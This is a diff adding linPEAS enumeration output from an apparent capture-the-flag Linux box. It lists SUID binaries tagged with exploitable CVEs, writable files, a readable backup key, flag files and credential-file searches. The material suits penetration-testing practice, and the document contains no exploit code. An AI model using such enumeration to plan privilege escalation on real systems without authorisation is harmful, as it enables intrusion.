@@ -1443,3 +1443,726 @@ drwx------ 3 will will 4096 Dec  3  2020 /home/will/.gnupg
 
 -rw-r----- 1 root adm 8400 Mar 15 21:35 /var/log/apache2/error.log
 
+╔══════════╣ Analyzing Other Interesting Files (limit 70)
+-rw-r--r-- 1 root root 3771 Apr  4  2018 /etc/skel/.bashrc
+-rw-r--r-- 1 mat mat 3771 Dec  3  2020 /home/mat/.bashrc
+-rw-r--r-- 1 toby toby 3771 Dec  3  2020 /home/toby/.bashrc
+-rw-r--r-- 1 will will 3771 Dec  3  2020 /home/will/.bashrc
+
+-rw-r--r-- 1 root root 807 Apr  4  2018 /etc/skel/.profile
+-rw-r--r-- 1 mat mat 807 Dec  3  2020 /home/mat/.profile
+-rw-r--r-- 1 toby toby 807 Dec  3  2020 /home/toby/.profile
+-rw-r--r-- 1 will will 807 Dec  3  2020 /home/will/.profile
+
+-rw-r--r-- 1 will will 0 Dec  3  2020 /home/will/.sudo_as_admin_successful
+
+                               ╔═══════════════════╗
+═══════════════════════════════╣ Interesting Files ╠═══════════════════════════════
+                               ╚═══════════════════╝
+╔══════════╣ SUID - Check easy privesc, exploits and write perms
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
+strings Not Found
+-rwsr-xr-x 1 root root 44K Mar 22  2019 /bin/su
+-rwsr-xr-x 1 root root 63K Jun 28  2019 /bin/ping
+-rwsr-xr-x 1 root root 43K Sep 16  2020 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+-rwsr-xr-x 1 root root 27K Sep 16  2020 /bin/umount  --->  BSD/Linux(08-1996)
+-rwsr-xr-x 1 root root 31K Aug 11  2016 /bin/fusermount
+-rwsr-xr-x 1 root root 19K Jun 28  2019 /usr/bin/traceroute6.iputils
+-rwsr-xr-x 1 root root 37K Mar 22  2019 /usr/bin/newuidmap
+-rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 40K Mar 22  2019 /usr/bin/newgrp  --->  HP-UX_10.20
+-rwsr-xr-x 1 root root 44K Mar 22  2019 /usr/bin/chsh
+-rwsr-xr-x 1 root root 59K Mar 22  2019 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+-rwsr-xr-x 1 root root 22K Mar 27  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
+-rwsr-xr-x 1 root root 146K Jan 31  2020 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
+-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
+-rwsr-xr-x 1 root root 37K Mar 22  2019 /usr/bin/newgidmap
+-rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/chfn  --->  SuSE_9.3/10
+-rwsr-xr-- 1 root messagebus 42K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+-rwsr-xr-x 1 root root 111K Jul 10  2020 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
+-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-xr-x 1 root root 427K Mar  4  2019 /usr/lib/openssh/ssh-keysign
+
+╔══════════╣ SGID
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
+-rwxr-sr-x 1 root shadow 34K Feb 27  2019 /sbin/unix_chkpwd
+-rwxr-sr-x 1 root shadow 34K Feb 27  2019 /sbin/pam_extrausers_chkpwd
+-rwxr-sr-x 1 root mlocate 43K Mar  1  2018 /usr/bin/mlocate
+-rwxr-sr-x 1 root ssh 355K Mar  4  2019 /usr/bin/ssh-agent
+-rwxr-sr-x 1 root tty 14K Jan 17  2018 /usr/bin/bsd-write
+-rwxr-sr-x 1 root tty 31K Sep 16  2020 /usr/bin/wall
+-rwxr-sr-x 1 root shadow 23K Mar 22  2019 /usr/bin/expiry
+-rwxr-sr-x 1 root shadow 71K Mar 22  2019 /usr/bin/chage
+-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
+-rwxr-sr-x 1 root crontab 39K Nov 16  2017 /usr/bin/crontab
+-rwxr-sr-x 1 root utmp 10K Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
+
+╔══════════╣ Checking misconfigurations of ld.so
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld-so
+/etc/ld.so.conf
+include /etc/ld.so.conf.d/*.conf
+
+/etc/ld.so.conf.d
+  /etc/ld.so.conf.d/libc.conf
+/usr/local/lib
+  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
+/usr/local/lib/x86_64-linux-gnu
+/lib/x86_64-linux-gnu
+/usr/lib/x86_64-linux-gnu
+
+╔══════════╣ Capabilities
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
+Current env capabilities:
+Current: =
+Current proc capabilities:
+CapInh:	0000000000000000
+CapPrm:	0000000000000000
+CapEff:	0000000000000000
+CapBnd:	0000003fffffffff
+CapAmb:	0000000000000000
+
+Parent Shell capabilities:
+0x0000000000000000=
+
+Files with capabilities (limited to 50):
+/usr/bin/mtr-packet = cap_net_raw+ep
+
+╔══════════╣ Users with capabilities
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
+
+╔══════════╣ AppArmor binary profiles
+-rw-r--r-- 1 root root  3194 Mar 26  2018 sbin.dhclient
+-rw-r--r-- 1 root root   125 Nov 23  2018 usr.bin.lxc-start
+-rw-r--r-- 1 root root  2857 Apr  7  2018 usr.bin.man
+-rw-r--r-- 1 root root 26245 Jul 10  2020 usr.lib.snapd.snap-confine.real
+-rw-r--r-- 1 root root  1550 Apr 24  2018 usr.sbin.rsyslogd
+-rw-r--r-- 1 root root  1353 Mar 31  2018 usr.sbin.tcpdump
+
+╔══════════╣ Files with ACLs (limited to 50)
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls
+files with acls in searched folders Not Found
+
+╔══════════╣ .sh files in path
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path
+/usr/bin/gettext.sh
+
+╔══════════╣ Executable files potentially added by user (limit 70)
++22:32:58.8001830490 /var/lib/lxcfs/cgroup/memory/lxc/ignite/cgroup.event_control
++22:32:58.7213442420 /var/lib/lxcfs/cgroup/memory/lxc/cgroup.event_control
++22:32:58.5625305680 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control
++22:32:58.5599319920 /var/lib/lxcfs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control
++22:32:58.4051499210 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-timesyncd.service/cgroup.event_control
++22:32:58.2462940790 /var/lib/lxcfs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
++22:32:58.2437717560 /var/lib/lxcfs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
++22:32:58.0848844770 /var/lib/lxcfs/cgroup/memory/system.slice/system-lvm2\x2dpvscan.slice/cgroup.event_control
++22:32:57.9235909120 /var/lib/lxcfs/cgroup/memory/system.slice/lvm2-lvmetad.service/cgroup.event_control
++22:32:57.7646404310 /var/lib/lxcfs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control
++22:32:57.6056322840 /var/lib/lxcfs/cgroup/memory/system.slice/snapd.socket/cgroup.event_control
++22:32:57.6030087450 /var/lib/lxcfs/cgroup/memory/system.slice/lxcfs.service/cgroup.event_control
++22:32:57.4443690430 /var/lib/lxcfs/cgroup/memory/system.slice/lxd.service/cgroup.event_control
++22:32:57.2895493890 /var/lib/lxcfs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control
++22:32:57.2869194760 /var/lib/lxcfs/cgroup/memory/system.slice/vsftpd.service/cgroup.event_control
++22:32:57.1273494540 /var/lib/lxcfs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
++22:32:56.9632126360 /var/lib/lxcfs/cgroup/memory/system.slice/ssh.service/cgroup.event_control
++22:32:56.8075595890 /var/lib/lxcfs/cgroup/memory/system.slice/unattended-upgrades.service/cgroup.event_control
++22:32:56.8048118850 /var/lib/lxcfs/cgroup/memory/system.slice/lxd.socket/cgroup.event_control
++22:32:56.6450469500 /var/lib/lxcfs/cgroup/memory/system.slice/atd.service/cgroup.event_control
++22:32:56.4851110880 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control
++22:32:56.3254514960 /var/lib/lxcfs/cgroup/memory/system.slice/accounts-daemon.service/cgroup.event_control
++22:32:56.3228508690 /var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
++22:32:56.1638675950 /var/lib/lxcfs/cgroup/memory/system.slice/networkd-dispatcher.service/cgroup.event_control
++22:32:56.0048304480 /var/lib/lxcfs/cgroup/memory/system.slice/polkit.service/cgroup.event_control
++22:32:56.0021577060 /var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-config.mount/cgroup.event_control
++22:32:55.8471975750 /var/lib/lxcfs/cgroup/memory/system.slice/boot.mount/cgroup.event_control
++22:32:55.6880896490 /var/lib/lxcfs/cgroup/memory/system.slice/system-serial\x2dgetty.slice/cgroup.event_control
++22:32:55.5291645600 /var/lib/lxcfs/cgroup/memory/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control
++22:32:55.5265410710 /var/lib/lxcfs/cgroup/memory/system.slice/cron.service/cgroup.event_control
++22:32:55.3674181970 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
++22:32:55.2082542080 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-networkd.service/cgroup.event_control
++22:32:55.2056642170 /var/lib/lxcfs/cgroup/memory/system.slice/apache2.service/cgroup.event_control
++22:32:55.0463693230 /var/lib/lxcfs/cgroup/memory/system.slice/amazon-ssm-agent.service/cgroup.event_control
++22:32:54.8899644510 /var/lib/lxcfs/cgroup/memory/system.slice/cgroup.event_control
++22:32:54.7265763070 /var/lib/lxcfs/cgroup/memory/user.slice/cgroup.event_control
++22:32:54.4914567660 /var/lib/lxcfs/cgroup/memory/cgroup.event_control
+2020-12-03+01:34:33.0902259270 /etc/console-setup/cached_setup_terminal.sh
+2020-12-03+01:34:33.0862259270 /etc/console-setup/cached_setup_keyboard.sh
+2020-12-03+01:34:33.0862259270 /etc/console-setup/cached_setup_font.sh
+
+╔══════════╣ Unexpected in /opt (usually empty)
+total 12
+drwxr-xr-x  3 root root 4096 Dec  3  2020 .
+drwxr-xr-x 24 root root 4096 Dec 12  2020 ..
+drwxrwx---  2 root adm  4096 Dec  3  2020 backups
+
+╔══════════╣ Unexpected in root
+/initrd.img.old
+/vmlinuz
+/vmlinuz.old
+/initrd.img
+/swap.img
+
+╔══════════╣ Files (scripts) in /etc/profile.d/
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files
+total 36
+drwxr-xr-x  2 root root 4096 Aug  6  2020 .
+drwxr-xr-x 95 root root 4096 Dec 12  2020 ..
+-rw-r--r--  1 root root   96 Sep 27  2019 01-locale-fix.sh
+-rw-r--r--  1 root root  825 Jul 10  2020 apps-bin-path.sh
+-rw-r--r--  1 root root  664 Apr  2  2018 bash_completion.sh
+-rw-r--r--  1 root root 1003 Dec 29  2015 cedilla-portuguese.sh
+-rw-r--r--  1 root root 1557 Dec  4  2017 Z97-byobu.sh
+-rwxr-xr-x  1 root root  873 Jun  3  2020 Z99-cloudinit-warnings.sh
+-rwxr-xr-x  1 root root 3417 Jun  3  2020 Z99-cloud-locale-test.sh
+
+╔══════════╣ Permissions in init, init.d, systemd, and rc.d
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d
+
+═╣ Hashes inside passwd file? ........... No
+═╣ Writable passwd file? ................ No
+═╣ Credentials in fstab/mtab? ........... No
+═╣ Can I read shadow files? ............. No
+═╣ Can I read shadow plists? ............ No
+═╣ Can I write shadow plists? ........... No
+═╣ Can I read opasswd file? ............. No
+═╣ Can I write in network-scripts? ...... No
+═╣ Can I read root folder? .............. No
+
+╔══════════╣ Searching root files in home dirs (limit 30)
+/home/
+/home/mat/.bash_history
+/home/ftpuser
+/home/ftpuser/ftp/flag_2.txt
+/home/toby/.bash_history
+/root/
+/var/www
+/var/www/html
+/var/www/html/bunch.php
+/var/www/html/css
+/var/www/html/css/bootstrap.min.css.map
+/var/www/html/css/bootstrap.min.css
+/var/www/html/round.php
+/var/www/html/.htaccess
+/var/www/html/robots.txt
+/var/www/html/secret_file_do_not_read.txt
+/var/www/html/striped.php
+/var/www/html/more_secrets_a9f10a
+/var/www/html/more_secrets_a9f10a/flag_3.txt
+/var/www/html/images
+/var/www/html/images/placemat1.jpg
+/var/www/html/images/placemat2.jpg
+/var/www/html/images/placemat3.jpg
+/var/www/html/flag_1.txt
+/var/www/html/post.php
+/var/www/html/index.php
+
+╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
+/home/mat/scripts
+
+╔══════════╣ Readable files belonging to root and readable by me but not world readable
+-rw-rw---- 1 root adm 2270 Dec  3  2020 /opt/backups/key.b64
+-rw-r----- 1 root adm 40588 Mar 15 21:35 /var/log/apache2/access.log
+-rw-r----- 1 root adm 8400 Mar 15 21:35 /var/log/apache2/error.log
+-rw-r----- 1 root adm 0 Dec  3  2020 /var/log/apache2/other_vhosts_access.log
+-rw-r----- 1 root adm 28898 Dec 12  2020 /var/log/apt/term.log
+
+╔══════════╣ Modified interesting files in the last 5mins (limit 100)
+/tmp/cow.jpg
+/var/log/journal/ec6c05333ff74080b8bd26a785d12724/system.journal
+/var/log/auth.log
+/var/log/syslog
+
+logrotate 3.11.0
+
+╔══════════╣ Files inside /home/mat (limit 20)
+total 312
+drwxr-xr-x 6 mat  mat    4096 Dec  3  2020 .
+drwxr-xr-x 6 root root   4096 Dec  3  2020 ..
+lrwxrwxrwx 1 root root      9 Dec  3  2020 .bash_history -> /dev/null
+-rw-r--r-- 1 mat  mat     220 Dec  3  2020 .bash_logout
+-rw-r--r-- 1 mat  mat    3771 Dec  3  2020 .bashrc
+drwx------ 2 mat  mat    4096 Dec  3  2020 .cache
+-rw-r--r-- 1 mat  mat  270433 Dec  3  2020 cow.jpg
+-rw------- 1 mat  mat      37 Dec  3  2020 flag_5.txt
+drwx------ 3 mat  mat    4096 Dec  3  2020 .gnupg
+drwxrwxr-x 3 mat  mat    4096 Dec  3  2020 .local
+-rw-r--r-- 1 will will    141 Dec  3  2020 note.txt
+-rw-r--r-- 1 mat  mat     807 Dec  3  2020 .profile
+drwxrwxr-x 3 will will   4096 Mar 15 21:59 scripts
+
+╔══════════╣ Files inside others home (limit 20)
+/home/mat/cow.jpg
+/home/mat/note.txt
+/home/mat/scripts/__pycache__/cmd.cpython-36.pyc
+/home/mat/scripts/cmd.py
+/home/mat/.bashrc
+/home/mat/.bash_logout
+/home/mat/flag_5.txt
+/home/mat/.profile
+/home/ftpuser/ftp/flag_2.txt
+/home/ftpuser/ftp/files/payload_ivan.php
+/home/toby/jobs/cow.sh
+/home/toby/note.txt
+/home/toby/.bashrc
+/home/toby/flag_4.txt
+/home/toby/.bash_logout
+/home/toby/.profile
+/var/www/html/bunch.php
+/var/www/html/css/bootstrap.min.css.map
+/var/www/html/css/bootstrap.min.css
+/var/www/html/round.php
+
+╔══════════╣ Searching installed mail applications
+
+╔══════════╣ Mails (limit 50)
+
+╔══════════╣ Backup files (limited 100)
+-rw-r--r-- 1 root root 5850 Feb  5  2018 /etc/vsftpd.conf.bak
+-rw-r--r-- 1 root root 2765 Aug  6  2020 /etc/apt/sources.list.curtin.old
+-rw-r--r-- 1 root root 7857 Dec  9  2020 /lib/modules/4.15.0-128-generic/kernel/drivers/power/supply/wm831x_backup.ko
+-rw-r--r-- 1 root root 7905 Dec  9  2020 /lib/modules/4.15.0-128-generic/kernel/drivers/net/team/team_mode_activebackup.ko
+-rw-r--r-- 1 root root 7857 Nov 23  2020 /lib/modules/4.15.0-126-generic/kernel/drivers/power/supply/wm831x_backup.ko
+-rw-r--r-- 1 root root 7905 Nov 23  2020 /lib/modules/4.15.0-126-generic/kernel/drivers/net/team/team_mode_activebackup.ko
+-rw-r--r-- 1 root root 11755 Dec  3  2020 /usr/share/info/dir.old
+-rw-r--r-- 1 root root 1397 Aug  6  2020 /usr/share/sosreport/sos/plugins/__pycache__/ovirt_engine_backup.cpython-36.pyc
+-rw-r--r-- 1 root root 1758 Mar 24  2020 /usr/share/sosreport/sos/plugins/ovirt_engine_backup.py
+-rwxr-xr-x 1 root root 226 Dec  4  2017 /usr/share/byobu/desktop/byobu.desktop.old
+-rw-r--r-- 1 root root 2746 Jan 23  2020 /usr/share/man/man8/vgcfgbackup.8.gz
+-rw-r--r-- 1 root root 361345 Feb  2  2018 /usr/share/doc/manpages/Changes.old.gz
+-rw-r--r-- 1 root root 7867 Nov  7  2016 /usr/share/doc/telnet/README.telnet.old.gz
+-rw-r--r-- 1 root root 35544 Mar 25  2020 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
+-rw-r--r-- 1 root root 217469 Nov 23  2020 /usr/src/linux-headers-4.15.0-126-generic/.config.old
+-rw-r--r-- 1 root root 0 Nov 23  2020 /usr/src/linux-headers-4.15.0-126-generic/include/config/wm831x/backup.h
+-rw-r--r-- 1 root root 0 Nov 23  2020 /usr/src/linux-headers-4.15.0-126-generic/include/config/net/team/mode/activebackup.h
+-rw-r--r-- 1 root root 217469 Dec  9  2020 /usr/src/linux-headers-4.15.0-128-generic/.config.old
+-rw-r--r-- 1 root root 0 Dec  9  2020 /usr/src/linux-headers-4.15.0-128-generic/include/config/wm831x/backup.h
+-rw-r--r-- 1 root root 0 Dec  9  2020 /usr/src/linux-headers-4.15.0-128-generic/include/config/net/team/mode/activebackup.h
+
+╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
+Found /var/lib/mlocate/mlocate.db: regular file, no read permission
+
+╔══════════╣ Web files?(output limit)
+/var/www/:
+total 12K
+drwxr-xr-x  3 root root 4.0K Dec  3  2020 .
+drwxr-xr-x 14 root root 4.0K Dec  3  2020 ..
+drwxr-xr-x  5 root root 4.0K Dec  3  2020 html
+
+/var/www/html:
+total 60K
+drwxr-xr-x 5 root root 4.0K Dec  3  2020 .
+drwxr-xr-x 3 root root 4.0K Dec  3  2020 ..
+
+╔══════════╣ All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
+-rw-r--r-- 1 root root 220 Apr  4  2018 /etc/skel/.bash_logout
+-rw------- 1 root root 0 Aug  6  2020 /etc/.pwd.lock
+-rw-r--r-- 1 root root 1531 Dec  3  2020 /etc/apparmor.d/cache/.features
+-rw-r--r-- 1 root root 20 Mar 15 21:20 /run/cloud-init/.instance-id
+-rw-r--r-- 1 root root 2 Mar 15 21:19 /run/cloud-init/.ds-identify.result
+-rw-r--r-- 1 mat mat 220 Dec  3  2020 /home/mat/.bash_logout
+-rw-r--r-- 1 will will 220 Dec  3  2020 /home/will/.bash_logout
+-rw-r--r-- 1 toby toby 220 Dec  3  2020 /home/toby/.bash_logout
+-rw-r--r-- 1 landscape landscape 0 Aug  6  2020 /var/lib/landscape/.cleanup.user
+-rw-r--r-- 1 root root 47 Dec  3  2020 /var/www/html/.htaccess
+
+╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
+-rw-r--r-- 1 mat mat 270433 Mar 15 22:43 /tmp/cow.jpg
+-rwxr-xr-x 1 will will 828098 Feb 10 20:38 /tmp/linpeas.sh
+-rw-rw---- 1 root adm 2270 Dec  3  2020 /opt/backups/key.b64
+-rw-r--r-- 1 root root 31202 Dec 12  2020 /var/backups/apt.extended_states.0
+-rw-r--r-- 1 root root 3363 Dec  3  2020 /var/backups/apt.extended_states.1.gz
+
+╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
+/dev/mqueue
+/dev/shm
+/home/will
+/home/will/.bash_logout
+/home/will/.bashrc
+/home/will/.cache
+/home/will/.cache/motd.legal-displayed
+/home/will/.config
+/home/will/.config/lxc
+/home/will/.config/lxc/config.yml
+/home/will/.config/lxc/cookies
+/home/will/flag_6.txt
+/home/will/.gnupg
+/home/will/.gnupg/private-keys-v1.d
+/home/will/.profile
+/home/will/.sudo_as_admin_successful
+/run/lock
+/run/screen
+/tmp
+/tmp/.font-unix
+/tmp/.ICE-unix
+/tmp/linpeas.sh
+/tmp/.Test-unix
+/tmp/tmux-1000
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/crash
+/var/lib/lxcfs/cgroup/memory/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/lxc/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/lxc/ignite/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/accounts-daemon.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/amazon-ssm-agent.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/apache2.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/atd.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/boot.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/cron.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-lvmetad.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/lxcfs.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/lxd.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/lxd.socket/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/networkd-dispatcher.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/polkit.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/snapd.socket/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/ssh.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-config.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-networkd.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-resolved.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-timesyncd.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/system-lvm2x2dpvscan.slice/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/system-serialx2dgetty.slice/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/unattended-upgrades.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/system.slice/vsftpd.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/user.slice/cgroup.event_control
+/var/lib/php/sessions
+/var/tmp
+
+╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
+  Group will:
+/home/will/.config/lxc/config.yml
+  Group adm:
+/opt/backups
+/opt/backups/key.b64
+
+╔══════════╣ Searching passwords in history files
+
+╔══════════╣ Searching *password* or *credential* files in home (limit 70)
+/bin/systemd-ask-password
+/bin/systemd-tty-ask-password-agent
+/etc/pam.d/common-password
+/usr/lib/git-core/git-credential
+/usr/lib/git-core/git-credential-cache
+/usr/lib/git-core/git-credential-cache--daemon
+/usr/lib/git-core/git-credential-store
+  #)There are more creds/passwds files in the previous parent folder
+
+/usr/lib/grub/i386-pc/password.mod
+/usr/lib/grub/i386-pc/password_pbkdf2.mod
+/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py
+/usr/lib/python3/dist-packages/cloudinit/config/__pycache__/cc_set_passwords.cpython-36.pyc
+/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/client_credentials.py
+/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/client_credentials.cpython-36.pyc
+/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_password_credentials.cpython-36.pyc
+/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py
+/usr/lib/python3/dist-packages/twisted/cred/credentials.py
+/usr/lib/python3/dist-packages/twisted/cred/__pycache__/credentials.cpython-36.pyc
+/usr/share/dns/root.key
+/usr/share/doc/git/contrib/credential
+/usr/share/doc/git/contrib/credential/gnome-keyring/git-credential-gnome-keyring.c
+/usr/share/doc/git/contrib/credential/libsecret/git-credential-libsecret.c
+/usr/share/doc/git/contrib/credential/netrc/git-credential-netrc
+/usr/share/doc/git/contrib/credential/osxkeychain/git-credential-osxkeychain.c
+/usr/share/doc/git/contrib/credential/wincred/git-credential-wincred.c
+/usr/share/man/man1/git-credential.1.gz
+/usr/share/man/man1/git-credential-cache.1.gz
+/usr/share/man/man1/git-credential-cache--daemon.1.gz
+/usr/share/man/man1/git-credential-store.1.gz
+  #)There are more creds/passwds files in the previous parent folder
+
+/usr/share/man/man7/gitcredentials.7.gz
+/usr/share/man/man8/systemd-ask-password-console.path.8.gz
+/usr/share/man/man8/systemd-ask-password-console.service.8.gz
+/usr/share/man/man8/systemd-ask-password-wall.path.8.gz
+/usr/share/man/man8/systemd-ask-password-wall.service.8.gz
+  #)There are more creds/passwds files in the previous parent folder
+
+/usr/share/pam/common-password.md5sums
+/usr/share/ubuntu-advantage-tools/modules/credentials.sh
+/var/cache/debconf/passwords.dat
+/var/lib/cloud/instances/iid-datasource-none/sem/config_set_passwords
+/var/lib/lxd/server.key
+/var/lib/pam/password
+
+╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
+
+╔══════════╣ Searching passwords inside logs (limit 70)
+ install base-passwd:amd64 <none> 3.5.44
+ status half-installed base-passwd:amd64 3.5.44
+ configure base-passwd:amd64 3.5.44 3.5.44
+ status half-configured base-passwd:amd64 3.5.44
+ status unpacked base-passwd:amd64 3.5.44
+ status installed base-passwd:amd64 3.5.44
+ status half-configured base-passwd:amd64 3.5.44
+ status half-installed base-passwd:amd64 3.5.44
+ status unpacked base-passwd:amd64 3.5.44
+ upgrade base-passwd:amd64 3.5.44 3.5.44
+ install passwd:amd64 <none> 1:4.5-1ubuntu1
+ status half-installed passwd:amd64 1:4.5-1ubuntu1
+ status unpacked passwd:amd64 1:4.5-1ubuntu1
+ configure base-passwd:amd64 3.5.44 <none>
+ status half-configured base-passwd:amd64 3.5.44
+ status installed base-passwd:amd64 3.5.44
+ status unpacked base-passwd:amd64 3.5.44
+ configure passwd:amd64 1:4.5-1ubuntu1 <none>
+ status half-configured passwd:amd64 1:4.5-1ubuntu1
+ status installed passwd:amd64 1:4.5-1ubuntu1
+ status unpacked passwd:amd64 1:4.5-1ubuntu1
+ configure passwd:amd64 1:4.5-1ubuntu2 <none>
+ status half-configured passwd:amd64 1:4.5-1ubuntu1
+ status half-configured passwd:amd64 1:4.5-1ubuntu2
+ status half-installed passwd:amd64 1:4.5-1ubuntu1
+ status installed passwd:amd64 1:4.5-1ubuntu2
+ status unpacked passwd:amd64 1:4.5-1ubuntu1
+ status unpacked passwd:amd64 1:4.5-1ubuntu2
+ upgrade passwd:amd64 1:4.5-1ubuntu1 1:4.5-1ubuntu2
+,245 - util.py[DEBUG]: Writing to /var/lib/cloud/instances/iid-datasource-none/sem/config_set_passwords - wb: [644] 25 bytes
+,246 - ssh_util.py[DEBUG]: line 123: option PasswordAuthentication added with yes
+,305 - cc_set_passwords.py[DEBUG]: Restarted the SSH daemon.
+,305 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords ran successfully
+,988 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,988 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,408 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
